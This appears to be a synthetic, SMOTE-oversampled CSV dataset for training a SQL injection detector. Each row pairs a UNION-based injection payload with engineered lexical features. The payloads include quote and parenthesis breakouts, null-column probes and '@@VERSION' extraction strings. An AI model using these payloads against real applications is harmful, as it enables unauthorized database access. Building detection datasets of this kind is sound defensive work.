id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001878,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.6610751203036955,71.18029548581448,16.0,3.1292237951665327,42.0,1.0,17.34423638865159,10.836059097162897,0.5904700641782321,0.014058811051862685,0.24327108234623834,0.15220004242366694,0.8360590971628978,0.16394090283710225,0.0,0.0,0.0,0.0,0.0,2.836059097162898,0.0,0.0,6.0,0.0,0.8360590971628976,0.1639409028371023,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001879,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,0.5377655509627403,64.0,21.199685738246064,3.774925988280709,14.000000000000002,35.201257047015744,4.7987429529842505,10.0,0.21875,0.5500196413596211,0.07498035864037891,0.15625,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.19968573824606295,0.0,0.0,6.800314261753937,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.19968573824606278,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001880,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,1.1390402738815373,59.425942900377564,22.0,3.7984930029488178,14.000000000000002,22.42594290037756,14.0,9.0,0.2358460740278154,0.3766925186407736,0.2358460740278154,0.1516153333035956,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.39351427490560986,0.0,3.60648572509439,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001881,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000131,1.0396515203751553,65.57631875696113,16.736639904381626,3.260705725128736,40.9465596175265,1.0,12.419839426289753,11.209919713144878,0.6270981433273709,0.015378799493540068,0.18708603980759245,0.1704370173714966,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.7366399043816256,0.7366399043816256,0.0,5.736639904381626,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001882,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000013,1.227369422592864,80.29731446630169,27.936914044931076,3.9533834705617057,42.0,4.0,24.297314466301692,10.0,0.5231897423892575,0.04982759451326263,0.30241367681432335,0.12456898628315655,0.0,0.7657714887672311,2.0,0.0,1.0,1.2342285112327689,0.0,1.5315429775344622,0.0,0.0,1.0000000000000004,4.234228511232769,0.0,0.7657714887672311,1.0,0.7657714887672311,0.0,1.0,0.765771488767231,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001883,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,1.1601688062901725,76.69664167483818,15.668540104677387,3.075245038238611,46.022481256128636,1.0,18.0,11.674160418709544,0.5984869510828972,0.01317504773192199,0.23715085917459586,0.15118714201058506,0.6685401046773861,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.005620314032159,0.0,0.6685401046773861,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001884,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,0.33732864320879036,77.13929380238491,26.765261946104978,4.1438919187865615,29.625968143720062,22.826309730524883,15.0,9.687015928139969,0.3859138911100273,0.2941272689865486,0.19477814637662197,0.12518069352680222,2.8435079640699845,0.0,0.9217539820349921,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.9217539820349923,2.9217539820349923,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001885,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,0.9242577225751125,65.10356169833324,25.0,3.886865962505307,19.0,25.425388176296213,14.0,6.678173522037026,0.2931286958453809,0.38834164218215644,0.2159895653597544,0.10254009661270816,0.32182647796297326,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.3563470440740537,2.0,0.32182647796297326,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001886,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,1.210718096351268,75.47084327959814,17.156947759866046,3.241752565874124,48.556037305907594,1.0,15.300455226979224,10.614350746711319,0.6392762805696546,0.013293751152332278,0.20595980749481096,0.1414701607832022,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2287014934226352,0.0,0.0,6.3856492532886815,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001887,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,1.1693234558556849,61.603524496301915,20.0,3.625285667382448,14.000000000000002,20.0,18.0,9.603524496301912,0.22727410286932132,0.32467728981331617,0.29220956083198457,0.15583904648537794,0.0,0.6035244963019114,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.0,3.0,0.0,0.6035244963019113,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001888,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,0.25200726309329424,76.35922715121399,16.0,3.092010375490478,48.97476344194237,1.0,14.512618279028814,11.871845430242796,0.640890228619925,0.013102592505192273,0.19055599339253662,0.15545118548234624,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1281545697572035,0.0,0.0,7.743690860485593,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001889,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000023,0.2163705126712787,73.0,32.77035242905377,4.389915518296985,42.0,3.229647570946227,17.0,10.770352429053775,0.5753424657534246,0.04424174754720858,0.2328767123287671,0.14753907437059963,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.229647570946226,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001890,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000150,1.1897693640030753,63.28961976773367,22.0,3.810282055608317,14.000000000000002,25.031695814186932,14.0,10.257923953546733,0.22555145209654331,0.3875630590234636,0.22555145209654331,0.1613340367834497,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,4.257923953546733,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001891,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000099,0.4255849975000798,71.76212935082306,20.447574129835388,3.367465953319549,14.000000000000002,42.20970348065844,4.0,11.55242587016461,0.19532514474901633,0.5879326999867824,0.05580718421400466,0.16093497105019675,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.552425870164612,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001892,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,0.5033097959281998,65.60560843416808,16.15493239620355,3.1796117807297617,40.760540830371625,1.0,14.0,9.845067603796453,0.6205663101903859,0.015284197520800819,0.21397876529121126,0.15017072699760203,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.15493239620354757,0.0,5.690135207592905,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001893,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,0.19574651000355686,61.255762474538855,22.0,3.7850258858859047,14.000000000000002,24.682033265436957,13.488475050922284,9.08525415817962,0.22859101571630533,0.40252708242897584,0.22059843838696602,0.14828346346775284,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.9147458418203804,0.0,0.0,4.170508316359239,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001894,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,1.2240820311406146,67.86902139302855,24.434510696514273,3.983341748074788,37.0,9.0,15.0,6.869021393028544,0.5452836271810392,0.13263655796295545,0.2210609299382591,0.1010188849177463,1.869021393028544,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0000000000000004,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001895,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,0.2996799858162739,76.23801085778801,16.0,3.092887197183469,48.780817372460824,1.0,14.609591313769588,11.847602171557604,0.639289753750015,0.013124456915983435,0.19220894284834525,0.15537684648565642,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.152397828442397,0.0,0.0,7.695204343115206,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001896,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,0.6396843445427027,77.53534633627551,21.6141385345102,3.650978259597044,14.000000000000002,34.4565541380408,16.7717229309796,12.307069267255102,0.18071883549255083,0.4433994528476746,0.21718887405807186,0.15869283760170266,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.6929307327448995,0.0,0.0,6.614138534510202,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001897,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000093,0.7577856023707461,57.73697202304375,21.497631276917044,3.7409709063697862,22.981050215336367,14.25829053079034,14.0,6.497631276917046,0.3914477392302118,0.252455764965501,0.24398963958054748,0.11210685622373967,1.0,0.0,2.751184361541477,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.7464469153755684,3.751184361541477,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001898,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000014,0.7944387060037661,80.60915674917251,33.0,4.309807474699067,42.0,3.845461861019169,21.22730930509584,13.536385583057504,0.5219537949439951,0.04759292442480481,0.2628195647404049,0.16763371589079523,2.536385583057504,0.0,2.0,0.0,1.0,1.845461861019168,0.0,0.0,0.0,0.0,1.0000000000000004,5.845461861019168,0.845461861019168,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001899,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.5377314703064309,73.30124404655739,16.43374801551913,3.167860599191636,44.457905421275065,1.0,16.987921297122032,10.855417328160291,0.6043067456063776,0.013665767481728819,0.2334890158701566,0.14853847104173692,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7108346563205803,0.0,0.0,6.14458267183971,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001900,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000148,0.9411863381893961,80.0,26.812182734555545,4.003818462215904,23.21827410183332,27.56345179633336,19.62436546911109,9.593908632722227,0.29022842627291645,0.34454314745416703,0.24530456836388867,0.11992385790902785,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.7030456836388863,0.0,0.0,2.8908629490833406,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001901,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,1.2550244296798323,60.779754686858915,18.587160379510077,3.633801473394757,14.000000000000002,32.95407544587907,4.0,9.825679240979845,0.23322356637258898,0.5382453276129906,0.06663530467788258,0.16189580133653786,0.0,0.5871603795100777,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.2385188614697675,3.0,0.0,0.5871603795100777,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001902,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,0.6542039719958338,71.7789062990364,30.22109370096361,4.311576835768451,43.376874960770884,1.9999999999999982,16.402031338265502,10.0,0.6051679475643312,0.027880316419927192,0.22755015391610542,0.13940158209963605,0.0,0.0,2.0,0.0,1.844218740192722,1.0,0.0,0.31156251961455617,0.0,0.0,1.0000000000000004,4.844218740192723,0.0,0.0,1.0,0.0,0.0,1.0,0.15578125980727808,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001903,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.15707074038102117,68.35880248197627,19.0,3.6617819535116127,14.000000000000002,39.450402127408225,4.0,10.908400354568037,0.20526396976346045,0.5764757964458807,0.058646848503845855,0.15961338528681307,0.045799822715981375,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.862600531852056,3.0,0.04579982271598132,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001904,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,0.9957959240540246,72.30059892706542,15.300598927065428,3.113685198154636,44.79760429173829,1.0,15.202395708261713,11.300598927065428,0.6197869022755226,0.013831697312202157,0.21011493645660717,0.15626646395566804,0.0,0.30059892706542835,2.0,0.0,0.0,0.0,0.0,2.3005989270654283,0.0,0.0,6.699401072934572,2.0,0.0,0.30059892706542835,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001905,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,0.9258514711085332,62.7902820678547,22.0,3.746471840318614,14.000000000000002,28.774085514279193,10.419435864290607,9.5967606892849,0.22308812783043913,0.45703187672707934,0.16714181320997984,0.15273818223250168,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.403239310715101,0.0,0.0,5.193521378569798,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001906,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,1.9405682760161025,75.87175157009906,30.20515526868808,4.197725165869358,42.0,3.358968946262383,19.871751570099068,10.641031053737617,0.5549444332920411,0.044070603478244014,0.2600740889439451,0.1409108742857697,0.0,0.3589689462623833,2.0,0.0,1.0,1.0,0.0,0.7179378925247668,0.0,0.0,1.0000000000000004,4.641031053737617,0.0,0.3589689462623833,1.0,0.3589689462623833,0.0,1.0,0.3589689462623832,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001907,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000082,0.23785664644656068,58.65896850084249,16.926781277684167,3.286308788948416,34.58574977852666,1.0,14.0,9.073218722315833,0.5891838801147455,0.017071804297261323,0.23900526016165854,0.1547390554263345,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.9267812776841674,0.0,4.146437444631665,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001908,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,0.5370709946901208,61.817898553154755,20.0,3.631430622958389,14.000000000000002,20.0,18.0,9.817898553154755,0.22648054475299667,0.32354363536142383,0.2911892718252814,0.15878654806029807,0.0,0.8178985531547558,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.0,3.0,0.0,0.8178985531547558,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001909,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,0.3614939213001548,75.96525513583958,15.905932285076325,3.086641624749537,48.87118742091591,1.0,14.376270859694698,11.717796855228977,0.6424279170835392,0.013190622759575055,0.19036979226578857,0.15401166789109724,0.9059322850763256,0.0,0.0,0.0,0.0,0.0,0.0,2.0940677149236744,0.0,0.0,7.717796855228977,0.0,0.9059322850763256,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001910,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000105,0.5492338774309877,63.83000234824673,17.0,3.2597268596494797,38.55333489883115,1.0,14.0,10.276667449415577,0.6039383504469719,0.01568207905492372,0.21954910676893163,0.16083046372917276,1.0,0.0,0.27666744941557564,0.0,0.0,0.0,0.0,2.0,1.0,0.0,5.138333724707788,0.2766674494155752,1.0,0.0,0.13833372470778776,0.8616662752922122,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
